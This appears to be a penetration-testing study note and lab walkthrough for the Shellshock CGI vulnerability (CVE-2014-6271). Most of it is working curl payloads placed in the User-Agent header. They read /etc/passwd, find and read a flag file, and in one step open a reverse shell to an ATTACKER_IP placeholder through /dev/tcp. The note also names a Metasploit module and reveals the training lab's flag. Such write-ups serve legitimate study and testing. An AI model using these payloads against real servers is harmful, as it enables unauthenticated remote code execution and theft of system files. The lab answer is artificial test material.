# Section 20 — CGI Shellshock (CVE-2014-6271)

**Affected:** GNU Bash < 4.3 on any system using CGI  
**Root cause:** Bash imports environment variables including function definitions. Vulnerable versions execute any commands appended after the function definition. The HTTP User-Agent header becomes an environment variable that Bash processes.  
**Result:** Unauthenticated RCE as the web server user (typically `www-data`).  
**Common locations:** Legacy Linux servers, IoT devices, embedded systems.

---

## Attack Flow

### 1 — Find CGI script
```bash
gobuster dir -u http://TARGET/cgi-bin/ \
  -w /usr/share/wordlists/dirb/small.txt \
  -x cgi -q
# Common find: /access.cgi, /status.cgi, /test.cgi
```

### 2 — Confirm vulnerability
```bash
curl -s -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' \
  bash -s :'' http://TARGET/cgi-bin/access.cgi
# If /etc/passwd contents returned → vulnerable
# If empty response → patched
```

### 3 — Find and read the flag
```bash
# Locate flag.txt
curl -s -H 'User-Agent: () { :; }; echo ; echo ; /usr/bin/find / -name flag.txt 2>/dev/null' \
  bash -s :'' http://TARGET/cgi-bin/access.cgi

# Read it
curl -s -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /path/to/flag.txt' \
  bash -s :'' http://TARGET/cgi-bin/access.cgi
```

### 4 — Reverse shell
```bash
# Listener
nc -lvnp 7777

# Trigger
curl -s -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1' \
  http://TARGET/cgi-bin/access.cgi

# Lands as: www-data
```

---

## How the Payload Works

```
User-Agent: () { :; }; echo ; echo ; COMMAND
            \_________/  \_________/ \_______/
            func def     two newlines  injected
            (imported    (required for  command
            by bash)     HTTP response)
```

Bash imports `() { :; }` as a function definition, then executes whatever follows it. The two `echo` statements add blank lines that separate CGI output headers from body — without them the response body may not render.

---

## Exam Notes

- Payload goes in **User-Agent** header (most common), also works in `Referer`, `Cookie`, custom headers
- Requires **two newlines** (`echo ; echo ;`) before the command or output may be swallowed
- Shell runs as `www-data` — rarely root unless misconfigured
- Common on IoT devices and old Ubuntu/Debian systems
- `curl bash -s :''` syntax: bash reads from stdin (empty), but the env var is already set — this is just part of the PoC template, not strictly required for CGI exploitation
- MSF module: `exploit/multi/http/apache_mod_cgi_bash_env_exec`

---

## Lab Walkthrough (`10.129.205.27` — ACADEMY-ACA-LOUSY)

```bash
# 1. Find CGI script
gobuster dir -u http://10.129.205.27/cgi-bin/ \
  -w /usr/share/wordlists/dirb/small.txt -x cgi -q
# → /access.cgi (200)

# 2. Confirm vuln
curl -s -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' \
  bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
# → /etc/passwd contents returned

# 3. Find flag
curl -s -H 'User-Agent: () { :; }; echo ; echo ; /usr/bin/find / -name flag.txt 2>/dev/null' \
  bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
# → /usr/lib/cgi-bin/flag.txt

# 4. Read flag
curl -s -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /usr/lib/cgi-bin/flag.txt' \
  bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
```

**Flag:** `Sh3ll_Sh0cK_123`  
**Shell user:** `www-data`
